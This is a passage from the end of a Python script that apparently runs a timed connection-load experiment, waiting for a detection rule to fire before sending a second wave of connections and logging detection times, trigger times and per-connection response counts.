                    else: run = []
                    if len(run) >= 3 and t_det2 is None:
                        t_det2 = time.time(); fired2 = run[-3:]
                if t_det2 is not None: break
                time.sleep(0.5)
            if t_det2 is not None:
                t_trig2 = min(max(t_det2 + 30, t_load + 30), t_cap)
                tlog.write('t_det2 %d (+%.1f s after load start); rule: %s\n' % (t_det2 * 1000, t_det2 - t_load, desc))
                for l in fired2: tlog.write('  fired2 by: %s\n' % l)
            elif load_alive():
                t_trig2 = t_cap
                tlog.write('undetected2 by cap (+%.1f s); firing wave 2 at the cap\n' % (t_cap - t_load))
        if t_trig2 is not None:
            while time.time() < t_trig2 and load_alive():
                time.sleep(0.2)
            if load_alive():
                fire2.set()
                tlog.write('t_trig2 %d (+%.1f s after load start) rule %s k2=%d\n' % (time.time() * 1000, time.time() - t_load, r2, a.trig2_n))
                if t_trig1 is None: end_base = time.time()
            else:
                tlog.write('# wave 2 not sent: load connections ended at %d\n' % (time.time() * 1000))
    dl = end_base + a.hold_s
    ext = dl + 300
    while True:
        now = time.time()
        if not load_alive() or (a.n == 0 and a.trig2_n and fire2.is_set() and not any(t.is_alive() for t in t2threads)
                                and not any(t.is_alive() for t in tthreads) and now >= dl):
            clog.write('# all connections ended at %d\n' % (now * 1000)); break
        if now >= dl:
            with st.lock: ok = all(st.resp.get(i, 0) >= a.min_resp for i in range(a.n))
            if ok or now >= ext: break
        time.sleep(0.5)
    stop.set()
    with st.lock:
        clog.write('# end %d done=%d err=%d resp_per_conn=%s trig_outstanding=%d\n' % (time.time() * 1000, st.done, st.err,
                                                                                      dict(st.resp), st.tout))
    time.sleep(1.2)
    return 0


if __name__ == '__main__':
    sys.exit(main())
